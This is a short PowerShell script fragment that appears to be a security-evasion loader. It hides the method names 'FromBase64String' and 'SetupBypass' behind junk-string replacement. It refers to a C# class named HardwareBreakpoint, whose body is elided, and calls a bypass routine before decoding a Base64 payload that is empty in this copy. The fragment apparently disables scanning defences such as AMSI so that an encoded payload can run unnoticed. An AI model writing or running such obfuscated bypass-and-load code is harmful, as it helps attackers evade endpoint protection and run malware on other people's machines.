$GLkht = 'FghkrRerghkrReoghkrRemghkrReBghkrReaghkrResghkrReeghkrRe6ghkrRe4StringhkrReg'.Replace('ghkrRe',''),'gItynSgItynegItyntgItynugItynpgItynBgItynygItynpgItynagItynsgItyns'.Replace('gItyn','')
$HardwareBreakpoint = @"
using System;
...
[Test.Program]::($GLkht[1])();

$fjhgt=""

[System.Text.Encoding]::Default.GetString([System.Convert]::($GLkht[0])($fjhgt))
